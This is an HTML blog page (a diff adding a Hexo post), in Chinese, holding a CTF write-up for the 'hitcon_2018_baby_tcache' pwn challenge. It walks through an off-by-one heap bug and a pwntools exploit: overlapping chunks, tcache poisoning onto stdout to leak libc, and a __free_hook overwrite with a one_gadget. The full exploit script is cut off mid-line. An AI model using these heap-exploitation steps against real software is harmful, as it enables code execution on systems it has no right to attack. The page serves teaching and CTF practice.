@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="查看保护 保护全开，改hook吧。这题和children_tcache相似，只不过这题没有show，所以想要泄露的话就需要打stdout 分析new 判断202060有没有值，接下来输入size，size要&lt;&#x3D;0x2000，接下来输入data，跟进sub_B88函数  最后一个字节由0填充。接下来v3[size]&#x3D;0这里出问题了，因为v3&#x3D;malloc(si">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitcon_2018_baby_tcache">
+<meta property="og:url" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="查看保护 保护全开，改hook吧。这题和children_tcache相似，只不过这题没有show，所以想要泄露的话就需要打stdout 分析new 判断202060有没有值，接下来输入size，size要&lt;&#x3D;0x2000，接下来输入data，跟进sub_B88函数  最后一个字节由0填充。接下来v3[size]&#x3D;0这里出问题了，因为v3&#x3D;malloc(si">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/1.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/2.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/3.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/4.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/5.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/6.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/7.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/8.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/9.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/10.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/11.png">
+<meta property="og:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/12.png">
+<meta property="article:published_time" content="2021-10-08T06:52:23.000Z">
+<meta property="article:modified_time" content="2022-05-06T00:48:31.362Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/08/hitcon-2018-baby-tcache/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hitcon_2018_baby_tcache</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/10/09/IO-FILE/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/10/07/LCTF2018-easyheap/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/08/hitcon-2018-baby-tcache/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&text=hitcon_2018_baby_tcache"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&is_video=false&description=hitcon_2018_baby_tcache"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hitcon_2018_baby_tcache&body=Check out this article: http://example.com/2021/10/08/hitcon-2018-baby-tcache/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&title=hitcon_2018_baby_tcache"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&name=hitcon_2018_baby_tcache&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/08/hitcon-2018-baby-tcache/&t=hitcon_2018_baby_tcache"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#new"><span class="toc-number">2.1.</span> <span class="toc-text">new</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete"><span class="toc-number">2.2.</span> <span class="toc-text">delete</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">3.</span> <span class="toc-text">编写exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        hitcon_2018_baby_tcache
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-08T06:52:23.000Z" itemprop="datePublished">2021-10-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%A2%98%E7%9B%AE/">题目</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="4">
+
+<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/2021/10/08/hitcon-2018-baby-tcache/1.png"></p>
+<p>保护全开，改hook吧。这题和children_tcache相似，只不过这题没有show，所以想要泄露的话就需要打stdout</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p><img src="/2021/10/08/hitcon-2018-baby-tcache/2.png"></p>
+<p>判断202060有没有值，接下来输入size，size要&lt;&#x3D;0x2000，接下来输入data，跟进sub_B88函数</p>
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/3.png"></p>
+<p>最后一个字节由0填充。接下来v3[size]&#x3D;0这里出问题了，因为v3&#x3D;malloc(size)的指针，而v3[size]这里的长度其实是size + 1被给成了0，所以有一个off-by-one漏洞。在全局202060中存入了v3，2020c0存入了size。上个自动化函数吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Data:&#x27;</span>, content)</span><br></pre></td></tr></table></figure>
+
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><img src="/2021/10/08/hitcon-2018-baby-tcache/4.png"></p>
+<p>输入index，index &lt; 9，判断指针是否为空，将空间给上0xda，释放指针，将指针清0。没有UAF</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+<h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><p>因为保护全开，可以改hook来getshell，所以需要知道libc_base，libc_base可以跟据main_arena的偏移进行计算。但是要有show功能，这题没有show这个函数，所以考虑通过stdout来泄露libc_base，又因为这题是2.27所以tcache attack来getshell。这里难点是需要打stdout，其实可以将IO_2_1_stdout作为fake_chunk来启用。因为有off-by-one可以考虑使用overlapping，使用overlapping时就需要改prev_size和inuse。</p>
+<p>创建几个堆块看一下吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x500</span> - <span class="number">0x8</span>, <span class="string">&#x27;aaaa&#x27;</span>)                        <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>, <span class="string">&#x27;bbbb&#x27;</span>)                       <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">&#x27;cccc&#x27;</span>)                       <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>, <span class="string">&#x27;dddd&#x27;</span>)                       <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;eeee&#x27;</span>)                       <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x500</span> - <span class="number">0x8</span>, <span class="string">&#x27;ffff&#x27;</span>)                        <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>, <span class="string">&#x27;gggg&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555605000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE				chunk0</span><br><span class="line">Addr: 0x555555605250</span><br><span class="line">Size: 0x501</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE				chunk1</span><br><span class="line">Addr: 0x555555605750</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE				chunk2</span><br><span class="line">Addr: 0x555555605790</span><br><span class="line">Size: 0x51</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE				chunk3</span><br><span class="line">Addr: 0x5555556057e0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE				chunk4</span><br><span class="line">Addr: 0x555555605840</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE				chunk5</span><br><span class="line">Addr: 0x5555556058b0</span><br><span class="line">Size: 0x501</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE				chunk6</span><br><span class="line">Addr: 0x555555605db0</span><br><span class="line">Size: 0x81</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE						topchunk</span><br><span class="line">Addr: 0x555555605e30</span><br><span class="line">Size: 0x20081</span><br></pre></td></tr></table></figure>
+
+<p>可以将chunk5为目标地址向前进行overlapping。那么chunk5的prev_size就需要改为0x500 + 0x40+ 0x50 + 0x60 + 0x70 ，释放一下chunk4此时chunk4进tcache，再重启一下因为之前第一次创建的size是0x60，所以这一次创建0x68，让其能改chunk5的prev_size，又因为off-by-one的原因，填满0x68就可以覆盖chunk5的inuse位。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/5.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + <span class="string">&#x27;\x60\x06&#x27;</span></span><br><span class="line">new(<span class="number">0x68</span>, p1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/6.png"></p>
+<p>接下来就是伪造fake_chunk，将stdout挂进fake_chunk的data部分，可以选择chunk2来做fake_chunk，因为接下来还要释放0和5进行合并，而释放1的话会与top_chunk合并，所以选择释放2，因为在tcache中检查很少。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/7.png"></p>
+<p>接下来释放0和2发生堆合并进unstortedbin。<em>chunk0、chunk1、chunk2、chunk3、chunk4、chunk5合并成一个大堆块</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555605000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE			chunk0 - 5</span><br><span class="line">Addr: 0x555555605250</span><br><span class="line">Size: 0xb61</span><br><span class="line">fd: 0x7ffff7dcfca0</span><br><span class="line">bk: 0x7ffff7dcfca0</span><br><span class="line"></span><br><span class="line">Allocated chunk									chunk6</span><br><span class="line">Addr: 0x555555605db0</span><br><span class="line">Size: 0x80</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555605e30</span><br><span class="line">Size: 0x20081</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins		chunk2</span><br><span class="line">0x50 [  1]: 0x5555556057a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555605250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555605250 /* &#x27;PR`UUU&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<p>释放后的size为b60是因为0x500 + 0x40 + 0x50 + 0x60 + 0x70 + 0x500，如果重启chunk的话，可以重启0-5的任意一个。因为chunk2挂进tcace，chunk2做为fake_chunk需要将他的fd改为stdout那里。unstortedbin的特性，如果我们分割一部分堆块，使得chunk2刚好作为分割剩下堆块的头部，fd指向main_arena。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x530</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/8.png"></p>
+<p>接下来需要将fd指向main_arena给改成stdout，因为偏移是不变的，所以修改低两个字节为0x0760，从unstortedbin中直接申请堆块，内容写为\x60\x07，申请块的大小可以为chunk2 + chunk3，这时chunk4就会指向main_arena，在申请之前可以delete(4)，为了改hook准备。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/9.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0xa0</span>, <span class="string">&#x27;\x60\x07&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/10.png"></p>
+<p>可以看到fd被改为IO_2_1_stdout，接下来申请0x40一次就会重启0x5555556057a0，再申请一次就会到stdout那里。打stdout时，flag&#x3D;<em>0xfbad1800</em>，*_IO_read_ptr、_IO_read_end、_IO_read_base为0<em>，</em>部署_IO_write_base最后一个字节为\x00，使得输出缓冲区变大*</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x40</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">p1 = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">new(<span class="number">0x3e</span>, p1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/11.png"></p>
+<p>接收一下吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ed8b0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base = &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">onegadget = one[<span class="number">1</span>] + libc_base</span><br></pre></td></tr></table></figure>
+
+<p>hook地址出来之后下面要做的就是改hook为gadget，因为之前释放了chunk4，unstortedbin正好又到了chunk4的头，申请一次就会申请到chunk4，修改内容就可以修改fd。修改fd为hook打gadget。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0xa0</span>, p64(free_hook))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>, p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/08/hitcon-2018-baby-tcache/12.png"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./z1r0&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.27/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;Your choice: &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Data:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x500</span> - <span class="number">0x8</span>, <span class="string">&#x27;aaaa&#x27;</span>)            <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>, <span class="string">&#x27;bbbb&#x27;</span>)            <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">&#x27;cccc&#x27;</span>)            <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>, <span class="string">&#x27;dddd&#x27;</span>)            <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;eeee&#x27;</span>)            <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x500</span> - <span class="number">0x8</span>, <span class="string">&#x27;ffff&#x27;</span>)            <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>, <span class="string">&#x27;gggg&#x27;</span>)            <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + <span class="string">&#x27;\x60\x06&#x27;</span></span><br><span class="line">new(<span class="number">0x68</span>, p1)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x530</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0xa0</span>, <span class="string">&#x27;\x60\x07&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">p1 = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">new(<span class="number">0x3e</span>, p1)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span 